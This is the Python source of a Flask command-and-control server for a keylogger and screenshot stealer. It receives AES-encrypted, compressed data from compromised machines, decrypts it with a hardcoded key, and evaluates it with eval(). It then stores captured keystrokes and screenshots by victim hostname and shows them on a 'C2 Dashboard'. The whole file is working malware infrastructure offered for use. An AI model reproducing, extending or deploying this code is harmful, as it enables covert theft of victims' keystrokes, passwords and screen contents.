from flask import Flask, request, jsonify, send_from_directory
import base64
import zlib
from Crypto.Cipher import AES
import os
import datetime
import json

app = Flask(__name__)

# Railway storage (persistent volume)
BASE_DIR = os.environ.get("BASE_DIR", "c2_data")
LOGS_DIR = f"{BASE_DIR}/logs"
SHOTS_DIR = f"{BASE_DIR}/screenshots"
os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(SHOTS_DIR, exist_ok=True)

KEY = b'0123456789ABCDEF0123456789ABCDEF'
IV = b'0123456789ABCDEF'

def decrypt(encrypted_b64):
    try:
        enc_bytes = base64.b64decode(encrypted_b64)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        dec_padded = cipher.decrypt(enc_bytes)
        padding_len = dec_padded[-1]
        decrypted = dec_padded[:-padding_len]
        decompressed = zlib.decompress(decrypted).decode()
        return eval(decompressed)
    except: return None

def save_payload(payload):
    session_id = payload.get("hostname", "unknown")
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # JSON payload
    log_file = f"{LOGS_DIR}/session_{session_id}_{ts}.json"
    with open(log_file, "w") as f:
        json.dump(payload, f, indent=2)
    
    # Keys only
    if "keys" in payload and payload["keys"]:
        keys_file = f"{LOGS_DIR}/keys_{session_id}_{ts}.txt"
        with open(keys_file, "w", encoding="utf-8") as f:
            f.write(payload["keys"])
    
    print(f"[+] {session_id}: {len(payload.get('keys',''))} keys, {payload.get('screenshots',0)} shots")
    return True

@app.route("/receive", methods=["POST"])
def receive():
    data = request.json.get("data", "")
    if not data: return jsonify({"error": "No data"}), 400
    
    payload = decrypt(data)
    if not payload: return jsonify({"error": "Decrypt failed"}), 400
    
    save_payload(payload)
    return jsonify({"status": "ok"})

@app.route("/")
def dashboard():
    sessions = [f for f in os.listdir(LOGS_DIR) if f.endswith('.json')]
    shots = [f for f in os.listdir(SHOTS_DIR) if f.endswith('.png')]
    
    html = f"""
    <h1>🔥 C2 Dashboard</h1>
    <h2>Sessions ({len(sessions)})</h2>
    <ul>{''.join([f'<li><a href="/logs/{f}">{f}</a></li>' for f in sorted(sessions)[-10:]])}
    </ul>
    <h2>Screenshots ({len(shots)})</h2>
    <div style="display:flex;flex-wrap:wrap">
    {''.join([f'<a href="/shots/{f}"><img src="/shots/{f}" width="200" title="{f}"></a>' for f in sorted(shots)[-12:]])}
    </div>
    <p><a href="/logs/">All Logs</a> | <a href="/shots/">All Shots</a></p>
    """
    return html

@app.route("/logs/<path:filename>")
@app.route("/shots/<path:filename>")
def serve_file(filename):
    if ".json" in filename:
        return send_from_directory(LOGS_DIR, filename)
    return send_from_directory(SHOTS_DIR, filename)

@app.route("/logs/")
@app.route("/shots/")
def list_all():
    if "/logs/" in request.path:
        files = os.listdir(LOGS_DIR)
        return f"<h2>All Logs ({len(files)})</h2><pre>{chr(10).join(files)}</pre>"
    files = os.listdir(SHOTS_DIR)
    return f"<h2>All Shots ({len(files)})</h2><pre>{chr(10).join(files)}</pre>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"C2 running on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False)